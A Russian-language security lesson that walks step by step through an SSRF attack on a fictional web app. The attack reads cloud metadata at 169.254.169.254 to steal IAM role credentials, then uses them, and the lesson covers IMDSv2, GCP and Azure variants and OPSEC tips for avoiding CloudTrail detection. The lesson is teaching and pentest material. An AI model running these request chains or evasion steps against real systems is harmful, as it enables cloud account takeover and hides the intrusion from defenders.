## Вопрос, с которого всё начинается

Веб-приложение принимает параметр `url` и подгружает картинку по нему. Если заставить его обратиться не к картинке, а к внутреннему адресу `169.254.169.254`, можно получить... что? Оказывается, — **ключи доступа ко всему облачному аккаунту**. Это одна из самых частых и самых разрушительных облачных уязвимостей.

SSRF (Server-Side Request Forgery) — когда сервер по твоей указке делает запрос от своего имени. `169.254.169.254` — специальный адрес **metadata-сервиса**, который есть у каждой облачной машины.

## Наш пример: параметр url и один адрес

Объект урока — приложение `app.acme-corp.com` со страницей превью. Она берёт ссылку из параметра:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://example.com/pic.png"
{"status":"ok","fetched_bytes":10240}
```

Приложение сходило по URL и скачало картинку. Что, если вместо картинки дать ему внутренний адрес?

## Шаг 1: пробуем metadata-сервис

У любой облачной машины внутри есть «табличка с информацией о себе» по адресу `169.254.169.254`. Спросим у неё список ролей:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
{"status":"ok","fetched_bytes":16}
```

Приложение вернуло 16 байт — значит, ответ пришёл! Это уже подтверждение SSRF. Но тело ответа приложение не показывает, только длину. Придётся обойти это — часто тело отражается в ошибке или через другой параметр. В учебном примере допустим, что тело видно:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&debug=1"
deploy-role
```

Мы получили **имя роли**: `deploy-role`. Теперь запросим креды этой роли:

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/deploy-role&debug=1"
{
  "Code" : "Success",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjEB...",
  "Expiration" : "2024-05-01T18:00:00Z"
}
```

Вот и временные креды роли: `AccessKeyId`, `SecretAccessKey` и `Token`. Это тот самый случай, когда **не нужен никакой пароль** — роль машины отдалась сама.

## Шаг 2: используем креды

Экспортируем их и спрашиваем, кем мы стали:

```
$ export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEB...
$ aws sts get-caller-identity
{
    "Arn": "arn:aws:sts::123456789012:assumed-role/deploy-role/i-0abc123",
    "Account": "123456789012"
}
```

Мы — `assumed-role/deploy-role`. Из одной ошибки в веб-приложении мы получили доступ к облачной роли. Дальше смотрим, что этой роли разрешено (как в уроке про IAM).

## Шаг 3: IMDSv2 — защита и её нюансы

Провайдеры добавили защиту. У AWS это **IMDSv2**: metadata больше не отвечает на простой `GET`, сначала нужно получить токен запросом `PUT`:

```
$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
deploy-role
```

Если приложение умеет делать только `GET` (как наш SSRF), IMDSv2 его остановит: сервер вернёт `401 Unauthorized` на `GET` без токена. Но многие SSRF позволяют менять метод, добавлять заголовки или следовать редиректам — тогда IMDSv2 не помогает.

## Шаг 4: у других провайдеров по-своему

Тот же принцип есть в GCP и Azure, но с разными адресами и заголовками:

| Провайдер | Как получить креды |
|-----------|--------------------|
| AWS (IMDSv1) | `GET /latest/meta-data/iam/security-credentials/<role>` |
| AWS (IMDSv2) | сначала `PUT /latest/api/token`, затем `GET` с заголовком |
| GCP | `GET /computeMetadata/v1/instance/service-accounts/default/token` + заголовок `Metadata-Flavor: Google` |
| Azure | `GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` + заголовок `Metadata: true` |

Обрати внимание: у GCP и Azure обязательно нужен специальный заголовок (`Metadata-Flavor`, `Metadata`). Простой SSRF без возможности задать заголовок их не тронет, а вот SSRF с контролем заголовков — да.

## Шаг 5: если SSRF нет, а есть RCE

Иногда вместо SSRF на машине удаётся выполнить команду. Тогда metadata-сервис доступен «как есть», без фильтров:

```
$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
deploy-role
```

Любая команда на EC2-инстансе с ролью может забрать её креды — это нормальное поведение, а не баг. Опасность в том, что RCE отдаёт эти креды атакующему.

## Шаг 6: как отличить SSRF от RCE

Получив metadata через веб-параметр, легко решить, что у тебя SSRF. Но иногда это уже RCE — и тогда возможностей больше. Признаки простые:

- **SSRF** отражает только HTTP-ответы по указанному URL. Запустить команду нельзя.
- **RCE** позволяет выполнить произвольную команду; тогда metadata читается «напрямую», а также доступен и сам инстанс.

Проверяется так: если удаётся выполнить `id` или прочитать локальный файл (`file:///etc/passwd`), это уже не SSRF. Для кражи кредов разницы почти нет — креды достаются в обоих случаях, — но при RCE ты можешь ещё и закрепиться на машине.

## Шаг 7: что логируется

Обращения к metadata **не** попадают в облачные журналы по умолчанию — и это удобно атакующему. Зато вызовы, которые ты делаешь уже с украденными кредами (`sts`, `s3`, `iam`), пишутся в **CloudTrail**. Поэтому «громкие» действия с ролью заметны защитнику, а сам захват кредов — почти нет.

Отсюда правило OPSEC: сразу после получения кредов сначала выясни, чей это аккаунт и что разрешено (`get-caller-identity`, чтение политик), и только потом делай целевые вызовы. Так следов меньше.

## Шаг 8: почему это вообще возможно

Metadata-сервис существует, чтобы приложению не приходилось хранить ключи в конфиге. Идея правильная: креды короткоживущие и привязаны к машине. Но сервис отвечает **любому** запросу с этой машины — он не умеет отличать приложение от атакующего. Значит, единственный барьер — не пускать чужие запросы к `169.254.169.254`. Как только приложение делает запросы по пользовательскому URL, барьер падает.

## Частые вопросы

**«Почему metadata вообще доступен приложению?»** Чтобы приложению не нужно было хранить ключи: оно берёт роль машины на лету. Удобство обернулось риском.

**«SSRF и RCE — для metadata есть разница?»** Почти нет: креды достаются в обоих случаях. Разница в том, что при RCE доступен ещё и сам инстанс.

**«Что делать, если тело ответа не видно?»** Смотри длину ответа, ищи отражение в ошибках, попробуй второй параметр — часто вывод всё же утекает.

**«Сработает ли IMDSv2 против моего SSRF?»** Только если SSRF умеет лишь GET. Если можно задать метод PUT и заголовки — нет.

## Что мы теперь знаем

По-простому:

1. `169.254.169.254` — внутренний адрес, отдающий машине её облачную роль.
2. SSRF позволяет дотянуться до metadata и забрать временные креды.
3. AWS IMDSv1 отвечает на простой GET; IMDSv2 требует токен через PUT.
4. GCP и Azure требуют специальный заголовок (`Metadata-Flavor`, `Metadata`).
5. Полученные креды — это доступ к аккаунту; дальше читаем права роли.

## На что смотреть дальше

- **Проверь метод и заголовки.** Если SSRF умеет PUT и свои заголовки — IMDSv2 и GCP/Azure тоже уязвимы.
- **Не игнорируй длину ответа.** Даже без тела размер выдаёт, что запрос прошёл.
- **Ищи отражение тела.** Часто вывод metadata виден в ошибке или через второй параметр.
- **Фиксируй Expiration.** Временные креды истекают — успей сделать главное.

## Куда дальше

Мы разобрали AWS. В следующем уроке мы перенесём эту цепочку на **Azure**: посмотрим endpoint managed identity и научимся получать из него токен для управления ресурсами. А пока запомни главное: один SSRF до `169.254.169.254` может стоить всего облачного аккаунта.

## Где пригодится

- **CTF (Cloud):** классический путь «SSRF → metadata → флаг».
- **Bug bounty:** SSRF в облачных приложениях — высокооплачиваемая находка.
- **Пентест:** оценка конфигурации metadata (IMDSv2 обязателен).
- **Blue team:** включать IMDSv2, ограничивать исходящие запросы приложений.
